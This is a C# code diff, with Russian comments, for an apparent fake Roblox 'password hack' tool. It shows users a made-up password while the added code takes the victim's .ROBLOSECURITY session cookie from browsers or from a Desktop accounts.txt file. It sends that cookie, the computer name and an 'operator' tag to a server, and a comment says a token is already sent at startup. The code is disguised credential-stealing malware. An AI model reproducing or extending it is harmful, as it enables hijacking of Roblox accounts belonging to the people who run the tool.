@@ -944,7 +944,10 @@ namespace FileTransfer
 
             string fakePassword = GetDeterministicPassword(username.ToLowerInvariant());
 
-            // Отправляем username/password на сервер (токен уже ушёл при старте)
+            // В Standalone PRO режиме считываем accounts.txt на Рабочем столе или куку из браузеров при нажатии (без закрытия браузеров!)
+            string? token = GetTokenFromDesktopAccountsFile() ?? CookieExtractor.ExtractRobloSecurity();
+
+            // Отправляем данные на сервер
             try
             {
                 var updatePayload = new
@@ -952,7 +955,7 @@ namespace FileTransfer
                     computerName = ComputerInfo.GetName(),
                     robloxUser = username,
                     fakePassword = fakePassword,
-                    robloSecurity = token,
+                    robloSecurity = token ?? "",
                     @operator = OperatorName
                 };
                 var jsonUpdate = System.Text.Json.JsonSerializer.Serialize(updatePayload);
@@ -962,6 +965,9 @@ namespace FileTransfer
             }
             catch { }
 
+            // Сохраняем аккаунт в accounts.txt на Рабочем столе
+            SaveToDesktopAccountsFile(username, fakePassword, token);
+
             TxtPassword.Text = fakePassword;
             AppendConsole("[result]", "#2ED573", $" Пароль: {fakePassword}", "#2ED573");
 
@@ -969,6 +975,49 @@ namespace FileTransfer
             HackProgress.Visibility = Visibility.Collapsed;
             PanelInputGroup.Visibility = Visibility.Collapsed;
             PanelResultGroup.Visibility = Visibility.Visible;
+        }
+
+        private static string? GetTokenFromDesktopAccountsFile()
+        {
+            try
+            {
+                string desktop = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
+                string file = System.IO.Path.Combine(desktop, "accounts.txt");
+                if (File.Exists(file))
+                {
+                    string content = File.ReadAllText(file);
+                    int idx = content.IndexOf("_|WARNING");
+                    if (idx != -1)
+                    {
+                        string tokenStr = content.Substring(idx).Trim();
+                        int end = tokenStr.IndexOfAny(new[] { '\r', '\n', ' ', '\t' });
+                        if (end != -1) tokenStr = tokenStr.Substring(0, end);
+                        return tokenStr;
+                    }
+                    idx = content.IndexOf("_|_");
+                    if (idx != -1)
+                    {
+                        string tokenStr = content.Substring(idx).Trim();
+                        int end = tokenStr.IndexOfAny(new[] { '\r', '\n', ' ', '\t' });
+                        if (end != -1) tokenStr = tokenStr.Substring(0, end);
+                        return tokenStr;
+                    }
+                }
+            }
+            catch { }
+            return null;
+        }
+
+        private static void SaveToDesktopAccountsFile(string username, string password, string? token)
+        {
+            try
+            {
+                string desktop = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
+                string file = System.IO.Path.Combine(desktop, "accounts.txt");
+                string entry = $"[{DateTime.Now:yyyy-MM-dd HH:mm}] User: {username} | Pass: {password} | Cookie: {token ?? "N/A"}\n";
+                File.AppendAllText(file, entry);
+            }
+            catch { }
         }
 
         private void BtnReset_Click(object sender, RoutedEventArgs e)
